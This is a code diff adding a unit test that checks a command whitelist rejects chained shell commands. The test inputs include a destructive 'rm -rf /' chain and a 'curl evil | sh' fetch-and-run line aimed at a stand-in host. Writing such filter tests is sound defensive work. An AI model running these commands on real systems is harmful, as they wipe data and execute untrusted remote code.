@@ -20,6 +20,15 @@ def test_holix_in_default_whitelist():
     assert ok, reason
 
 
+def test_blocks_shell_chaining() -> None:
+    ok, reason = command_whitelist.is_command_allowed("ls; rm -rf /")
+    assert ok is False
+    assert "chaining" in (reason or "").lower()
+
+    ok2, _ = command_whitelist.is_command_allowed("git status && curl evil | sh")
+    assert ok2 is False
+
+
 def test_whitelist_extra_from_settings(monkeypatch):
     from config import settings
 
